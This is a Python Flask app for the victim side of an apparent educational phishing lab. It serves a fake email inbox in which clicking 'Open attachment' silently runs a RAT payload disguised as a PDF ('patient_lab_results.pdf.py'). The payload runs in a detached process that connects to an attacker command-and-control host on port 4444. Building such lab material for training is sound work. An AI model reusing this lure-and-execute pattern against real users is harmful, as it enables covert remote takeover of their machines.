"""
Web-based GUI for the Primary Doctor (victim) container.
Serves a fake email client; "Open attachment" runs the RAT payload.
Educational demo only.
"""
import os
import subprocess
import sys
from flask import Flask, render_template, request, jsonify

APP_DIR = os.path.dirname(os.path.abspath(__file__))
app = Flask(
    __name__,
    template_folder=os.path.join(APP_DIR, "templates"),
    static_folder=os.path.join(APP_DIR, "static"),
)

PAYLOAD_PY = "/app/inbox/patient_lab_results.pdf.py"


def _run_payload():
    """Run the RAT payload in a detached process with correct env for C2 connection."""
    env = dict(os.environ)
    env.setdefault("ATTACKER_HOST", "host.docker.internal")
    env.setdefault("ATTACKER_PORT", "4444")
    kwargs = {
        "cwd": "/app",
        "env": env,
        "stdout": subprocess.DEVNULL,
        "stderr": subprocess.DEVNULL,
    }
    if sys.platform != "win32":
        kwargs["start_new_session"] = True
    subprocess.Popen(
        ["python3", PAYLOAD_PY],
        **kwargs,
    )


@app.route("/")
def index():
    return render_template("inbox.html")


@app.route("/email/<int:mid>")
def email_read(mid):
    if mid != 1:
        return "Not found", 404
    return render_template("email_read.html")


@app.route("/api/open-attachment", methods=["POST"])
def open_attachment():
    """Run the malicious attachment (RAT payload) in the background."""
    try:
        _run_payload()
        return jsonify({"ok": True, "message": "Opening attachment..."})
    except Exception as e:
        return jsonify({"ok": False, "message": str(e)}), 500


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080, debug=False)
